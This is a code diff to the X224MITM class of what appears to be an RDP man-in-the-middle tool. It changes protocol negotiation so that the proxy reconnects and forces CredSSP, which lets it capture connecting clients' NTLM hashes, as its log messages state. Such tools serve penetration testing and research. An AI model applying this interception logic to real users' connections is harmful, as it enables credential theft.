@@ -83,6 +83,9 @@ class X224MITM:
             # Tell the server we only support the allowed authentication methods.
             chosenProtocols &= self.state.config.authMethods
 
+        if not self.state.ntlmCapture:
+            chosenProtocols = NegotiationProtocols.SSL | NegotiationProtocols.CRED_SSP
+
         modifiedRequest = NegotiationRequestPDU(
             self.originalNegotiationRequest.cookie,
             self.originalNegotiationRequest.flags,
@@ -99,6 +102,7 @@ class X224MITM:
         Awaits the coroutine that connects to the server.
         :param payload: the connection request payload
         """
+
         await self.connector()
         self.server.sendConnectionRequest(payload = payload)
 
@@ -118,31 +122,33 @@ class X224MITM:
         response = parser.parse(pdu.payload)
         if isinstance(response, NegotiationFailurePDU):
             if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER:
+
+                # Disconnect from current server
+                self.disconnector()
+
                 if self.state.canRedirect():
                     self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
                         "redirectionHost": self.state.config.redirectionHost,
                         "redirectionPort": self.state.config.redirectionPort
                     })
 
-                    # Disconnect from current server
-                    self.disconnector()
-
                     # Use redirection host and replay sequence starting from the connection request
                     self.state.useRedirectionHost()
                     self.onConnectionRequest(self.originalConnectionRequest)
                     return
                 else:
-                    # Respond with a RDP negotiation answer to proceed and capture NTLM hashes
-                    self.log.info("Server requires CredSSP. Closing connection with server and attempting to capture NTLM hashes.")
-                    payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
+                    self.log.info("Server requires CredSSP. Reconnecting with server and attempting to capture client's NTLM hashes.")
                     self.state.ntlmCapture = True
-
-                    self.disconnector()
+                    self.onConnectionRequest(pdu)
+                    return
             else:
                 self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                 payload = pdu.payload
         else:
-            payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))
+            if self.state.ntlmCapture:
+                payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
+            else:
+                payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))
 
         # FIXME: This should be done based on what authentication method the server selected, not on what
         #        the client supports.
